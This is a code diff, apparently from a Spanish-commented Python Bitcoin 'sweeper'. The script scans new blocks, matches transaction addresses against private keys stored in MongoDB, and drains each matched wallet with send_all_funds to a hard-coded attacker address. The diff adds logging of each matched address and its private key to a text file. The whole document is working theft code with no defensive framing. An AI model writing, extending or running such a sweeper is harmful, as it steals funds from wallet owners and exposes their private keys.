@@ -55,6 +55,20 @@ def buscar_wifMongoDB(address):
         return None
 
 
+def agregar_contenido_txt(nombre_archivo, contenido):
+    """
+    Crea un archivo TXT si no existe y agrega contenido en una nueva línea.
+
+    :param nombre_archivo: Nombre del archivo TXT (ej. "archivo.txt")
+    :param contenido: Contenido a agregar al archivo
+    """
+    try:
+        with open(nombre_archivo, 'a') as archivo:  # Modo 'a' para agregar contenido
+            archivo.write(contenido + '\n')  # Agregar contenido con un salto de línea
+    except Exception as e:
+        print(f"Ocurrió un error al escribir en el archivo: {e}")
+
+
 # Obtener Numero del Bloque
 def get_latest_block_number():
     data = {
@@ -319,7 +333,10 @@ def procesar_bloque_y_transacciones(bloque_id):
                     # Buscar en MongoDB, si existe retiramos saldo
                     searchMongoDBWIFSINComprimir = buscar_wifMongoDB(direccionSinComprimir)
                     if searchMongoDBWIFSINComprimir:
-                        print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIFSINComprimir}")
+                        print(f"[Nueva Transaccion] {direccionSinComprimir} :: {searchMongoDBWIFSINComprimir}")
+
+                        # Guardar la Wallet que se encontro con actividad reciente
+                        agregar_contenido_txt('actividadBTC.txt', f"{direccionSinComprimir} :: {searchMongoDBWIFSINComprimir}")
 
                         # Realizar Retiro
                         send_all_funds(searchMongoDBWIFSINComprimir, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
@@ -333,6 +350,9 @@ def procesar_bloque_y_transacciones(bloque_id):
                     searchMongoDBWIF = buscar_wifMongoDB(direccionComprimir)
                     if searchMongoDBWIF:
                         print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIF}")
+
+                        # Guardar la Wallet que se encontro con actividad reciente
+                        agregar_contenido_txt('actividadBTC.txt', f"{direccionComprimir} :: {searchMongoDBWIF}")
 
                         # Realizar Retiro
                         send_all_funds(searchMongoDBWIF, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
